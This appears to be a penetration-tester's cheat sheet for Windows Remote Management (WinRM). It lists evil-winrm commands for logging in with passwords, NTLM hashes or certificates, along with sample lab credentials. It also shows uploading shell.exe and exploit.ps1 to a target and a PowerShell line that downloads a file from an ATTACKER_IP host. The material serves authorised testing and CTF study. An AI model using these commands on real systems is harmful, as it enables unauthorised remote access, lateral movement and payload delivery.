# WinRM(S)

---

## Default Port

- 5985
- 5986

---

## Service Info

WinRM (Windows Remote Management) is a Windows-native remote administration protocol based on HTTP/HTTPS.

It is commonly used for:
- remote command execution on Windows systems
- post-compromise lateral movement
- administrative automation in domain environments

WinRM is often exposed on internal networks and becomes a direct execution channel when valid credentials or hashes are obtained.

---
## Common security issues

In MITRE ATT&CK’s “ATT&CK Matrix for Enterprise,” it is classified as follows:

- **Technique**: T1028 - Windows Remote Management
- **Tactics**: TA0008 - Lateral Movement

Additionally, in CAPEC (Common Attack Pattern Enumeration and Classification), it is classified as “CAPEC-555: Remote Services Using Stolen Credentials.”

- Weak or reused credentials
- NTLM hash authentication allowed
- Credential exposure from other services (SMB/HTTP/FTP)
- Misconfigured user privileges allowing remote execution
- Exposed WinRM service without proper network segmentation
- Password spraying attacks against domain accounts
- Kerberos/NTLM relay leading to authentication abuse
- Default or predictable service accounts with WinRM access

## 3. Access / Interaction

### with Credentials

```bash
evil-winrm -i <IP> -u <USER> -p <PASS>
```

```bash
evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'
```

check log

```bash
evil-winrm -i <IP> -u user -p pass -l
```

### with Hash

```bash
evil-winrm -i <IP> -u <USER> -H <NTLM_HASH>
```

```bash
evil-winrm -i 10.10.11.14 -u localadmin -H 9aa582783780d1546d62f2d102daefae
```

### with Key

```bash
  evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S
```


👉 If shell obtained:

→ [Windows Privilege Escalation](../04_privesc/windows.md)

### File Transfer (Upload / Download)

👉 Primary method: evil-winrm built-in transfer

#### Download (Target → Attacker)
```zsh
download file.txt
```

```zsh
download C:\Users\<USER>\Desktop\file.txt
```

#### Upload (Attacker → Target)
```zsh
upload shell.exe
```

```zsh
upload exploit.ps1 C:\Temp\exploit.ps1
```
Fallback Transfer (PowerShell)
```powershell
Invoke-WebRequest http://<ATTACKER_IP>/file.exe -OutFile C:\Temp\file.exe
```
